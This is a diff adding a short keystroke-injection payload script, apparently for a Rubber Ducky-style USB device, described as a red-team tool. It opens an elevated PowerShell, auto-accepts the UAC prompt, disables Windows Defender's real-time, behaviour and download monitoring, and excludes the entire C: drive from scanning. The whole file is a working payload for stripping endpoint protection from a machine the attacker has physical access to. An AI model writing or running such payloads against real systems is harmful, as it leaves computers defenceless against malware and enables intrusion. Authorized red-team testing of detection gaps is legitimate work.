@@ -1,0 +1,23 @@
+REM ============================================================
+REM  Windows · Disable Windows Defender (Admin Required)
+REM ============================================================
+REM  Opens an elevated PowerShell (triggers UAC) and disables
+REM  real-time monitoring. For authorized red-team engagements
+REM  where you need to test detection gaps.
+REM
+REM  Note: requires the user to click Yes on the UAC prompt,
+REM  or UAC to be pre-configured to auto-elevate.
+
+DEFAULTDELAY 60
+
+GUI r
+DELAY 700
+STRING powershell
+CTRL SHIFT ENTER
+DELAY 2000
+REM UAC prompt — press Alt+Y to accept
+ALT y
+DELAY 1500
+STRINGLN Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true
+STRINGLN Add-MpPreference -ExclusionPath "C:\"
+STRINGLN exit
